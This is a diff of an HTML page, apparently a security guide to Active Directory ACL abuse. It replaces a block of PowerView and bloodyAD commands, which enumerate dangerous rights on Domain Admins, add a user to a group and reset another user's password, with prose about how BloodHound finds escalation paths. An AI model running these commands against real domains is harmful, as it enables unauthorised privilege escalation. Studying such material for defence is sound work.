@@ -165,19 +165,18 @@
           quick flag that it is (or was) privileged and worth attention.
         </p>
 
-        <h2>Finding and abusing ACLs</h2>
+        <h2>Finding the paths</h2>
 
-        <pre><code># BloodHound is the primary tool — it computes the paths
-# Collect, then run "Shortest Path to Domain Admins" and the
-# outbound-control queries from any owned principal.
-
-# PowerView, for targeted checks
-Get-ObjectAcl -Identity "Domain Admins" -ResolveGUIDs |
-  ? { $_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner" }
-
-# bloodyAD / Impacket to actually abuse a found right
-bloodyAD -u jdoe -p pass -d corp.local add groupMember "Helpdesk Admins" jdoe
-bloodyAD -u jdoe -p pass -d corp.local set password targetuser 'NewPass123!'</code></pre>
+        <p>
+          The reason ACL abuse is so central to modern AD attacks is that it is <em>discoverable</em>
+          at scale. <a href="../toolkit.html">BloodHound</a> collects every ACE in the domain and
+          computes the graph, so an attacker asks it "what can this principal I control reach?" and
+          gets a concrete chain — a WriteDacl here, a ForceChangePassword there — from a nobody to
+          Domain Admin. The individual rights (GenericAll, WriteDacl, WriteOwner, ForceChangePassword,
+          AddMember, and the delegation-writing rights) and how each is turned into access are covered
+          with commands in the <a href="../vulns.html">Vulns &amp; Misconfigs</a> section under
+          <em>AD ACL Abuse</em>; this page is why those rights exist and how the mess accumulates.
+        </p>
 
         <h2>Detection and defence</h2>
 
